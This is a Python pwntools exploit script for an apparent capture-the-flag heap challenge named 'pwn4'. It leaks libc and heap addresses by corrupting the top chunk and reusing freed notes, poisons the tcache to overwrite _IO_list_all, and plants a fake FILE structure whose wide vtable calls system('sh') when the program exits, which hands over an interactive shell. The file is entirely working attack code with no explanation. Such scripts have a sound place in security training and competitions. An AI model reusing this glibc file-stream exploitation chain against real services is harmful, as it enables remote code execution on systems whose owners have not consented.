#!/usr/bin/env python3
from pwn import *

PORT = 1337
HOST = "pwn-scenery-c11dc45f1c19.training.bksec.vn"
elf = context.binary = ELF('./pwn4_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x0000000000001585
            brva 0x0000000000001633
            brva 0x00000000000016D2
            brva 0x0000000000001773
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=HOST)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def menu(opt): sla(b'Your choice: ', str(opt).encode())

def create(i, sz, dt):
    menu(0)
    sla(b'Index :', str(i).encode())
    sla(b'Size :', str(sz).encode())
    sa(b'your note :', dt)

def view(i):
    menu(1)
    sla(b'Index :', str(i).encode())

def delete(i):
    menu(2)
    sla(b'Index :', str(i).encode())

def send_void(sz, dt, privileged=0):
    menu(3)
    sla(b'Size: ', str(sz).encode())
    sla(b'Data: ', dt)
    sla(b'privileged mode: ', str(privileged).encode())

# Libc

for i in range(7):
    create(i, 0x80, b'A'*0x80)

# GDB()
create(7, 0x470, b'R'*0x470)
create(8, 0xe0, b'V'*0xe0)
send_void(0x308b10, b'X'*8)  # Overwrite 1 low-byte of top-chunk
create(9, 0x80, b'B'*0x80)

delete(0)

create(0, 0x20, b'C'*0x20) # guard

for i in range(1, 7):
    delete(i)
delete(8)
# GDB()

view(9)
p.recvuntil(b'Note: ')
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x204b20
log.info(f'libc: {hex(libc.address)}')

# Heap

delete(0)
for i in range(1, 7):
    create(i, 0x80, b'K'*0x80)

create(8, 0x80, b'J' * 0x80)
create(0, 0x80, b'Q' * 0x80)
delete(0)
view(9)
p.recvuntil(b'Note: ')
heap = u64(p.recvline().strip().ljust(8, b'\x00')) << 12
log.info(f'heap: {hex(heap)}')

# Unsorted consolidation
create(0, 0x80, b'H'*0x80)

for i in range(1, 7):
    delete(i)

delete(8)
delete(9)
delete(7) # unsorted 0x511

chunk7 = heap + 0x690
pl = flat({
    0x0: b'  sh\x00\x00\x00\x00',
    0x20: 0,  # write_base
    0x28: 1,  # write_ptr
    0x68: libc.sym.system,  # wide_vtable[0x68]
    0x88: chunk7 + 0x200,  #_lock
    0xa0: chunk7,          # _wide_data
    0xd8: libc.sym._IO_wfile_jumps,  # vtable
    0xe0: chunk7           # wide_vtable
    }, filler = b'\x00', length=0x370)

create(7, 0x370, pl)

create(9, 0xe0, b'E'*0xe0)
# GDB()
delete(9)

# FSOP trigger exit

pl = flat(
    b'A'*8, 0xf1,
    0, 0
).ljust(0x70, b'X')

create(9, 0x70, pl) # fake chunk
delete(0)
delete(9)

tg = (heap >> 12) ^ libc.sym._IO_list_all 
print(hex(libc.sym._IO_list_all))
print(hex(tg))

pl = flat(
    b'A'*16,
    tg
    )
# GDB()
create(9, 0x70, pl)


create(0, 0xe0, b'dump')
create(1, 0xe0, p64(chunk7))

menu(4)
p.interactive()

# d1nhdwc